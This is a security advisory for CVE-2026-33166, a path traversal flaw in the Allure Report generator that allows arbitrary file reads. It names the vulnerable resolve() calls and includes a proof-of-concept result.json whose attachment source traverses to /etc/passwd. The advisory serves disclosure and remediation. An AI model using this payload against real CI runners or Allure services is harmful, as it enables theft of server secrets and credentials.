# [H] Allure Report has an Arbitrary File Read via Path Traversal in Attachment Processing (Allure 1, Allure 2, and XCTest Readers)

## Summary
Severity: High
Advisory: GHSA-64hm-gfwq-jppw
CVE: CVE-2026-33166
CWE: CWE-22
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-03-18
Source: https://github.com/advisories/GHSA-64hm-gfwq-jppw
Type: github-advisory

## Affected
- Maven: `io.qameta.allure:allure-generator` — affected >=0 <2.38.0

## Details
### Summary
The Allure report generator is vulnerable to an arbitrary file read via path traversal when processing test results. An attacker can craft a malicious result file (-result.json, -container.json, or .plist) that points an attachment source to a sensitive file on the host system. During report generation, Allure will resolve these paths and include the sensitive files in the final report.

### Details
The vulnerability exists in several plugins where attachment paths are resolved using unvalidated user input. The code uses Path.resolve() without normalizing the path or checking if the resulting file remains within the intended results directory.

Affected Files and Lines:

Allure2Plugin.java (Line 264): `final Path attachmentFile = source.resolve(attachment.getSource());`

Allure1Plugin.java (Line 328): `final Path attachmentFile = source.resolve(attachment.getSource());`

XcTestPlugin.java (Line 181): `attachments.resolve(String.format("Screenshot_%s.%s", uuid, ext))`

Since `resolve()` allows absolute paths or ../ sequences to escape the base directory, any file readable by the process can be exfiltrated.

### PoC
1) Create a directory named allure-results.

2) Create a file malicious-result.json inside it:

```
{
  "uuid": "poc-traversal",
  "name": "Path Traversal PoC",
  "status": "passed",
  "attachments": [
    {
      "name": "Sensitive Data",
      "source": "../../../../../../../../../../../etc/passwd",
      "type": "text/plain"
    }
  ]
}
```
3) run `allure generate allure-results -o allure-report`

4) The content of `/etc/passwd` will now be present in `allure-report/data/attachments/`.


### Impact
This is a High Severity vulnerability. In CI/CD environments (GitHub Actions, Jenkins), an attacker submitting a Pull Request can exfiltrate server secrets, cloud credentials, or environment configuration files stored on the runner disk. It also may affect custom Allure web services where users can upload results, allowing them to read arbitrary files from the server's filesystem. Allure TestOps is not affected.

## References
- https://github.com/allure-framework/allure2/security/advisories/GHSA-64hm-gfwq-jppw
- https://nvd.nist.gov/vuln/detail/CVE-2026-33166
- https://github.com/allure-framework/allure2
